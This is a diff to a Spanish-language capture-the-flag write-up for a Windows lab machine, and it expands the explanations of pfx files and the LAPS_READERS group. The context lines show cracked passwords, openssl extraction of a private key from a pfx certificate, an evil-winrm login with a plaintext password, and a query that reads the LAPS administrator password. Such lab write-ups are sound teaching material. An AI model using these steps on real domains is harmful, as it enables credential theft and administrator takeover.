@@ -33,7 +33,7 @@ supremelegacy    (10.10.11.152-Shares_Dev_winrm_backup.zip/legacyy_dev_auth.pfx)
 ------------------------
 # Part 3: Crackenado archivos
 
-Los archivos pfx sirven para crear llaves con ellos.
+Los archivos pfx son archivos ilegibles (porque están cifrados) pero si se les pasan a openssl se pueden crear certificados y llaves.   
 ```console
 └─$ openssl pkcs12 -in ./legacyy_dev_auth.pfx -nocerts -out llave_legacy.key
 Enter Import Password:
@@ -58,7 +58,7 @@ thuglegacy       (legacyy_dev_auth.pfx)
 ```console
 └─$ evil-winrm -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
 ```
-- Nuestro usuario está en LAPS_READERS
+- Nuestro usuario está en LAPS_READERS (usaurios especiales que pueden leer la contraseña del admin "Solución de contraseñas de administrador local")
 ```console
 *Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer DC01 -property 'ms-mcs-admpwd'
 ms-mcs-admpwd     : EB71J5m-1V-18@%z#w9&4L3x
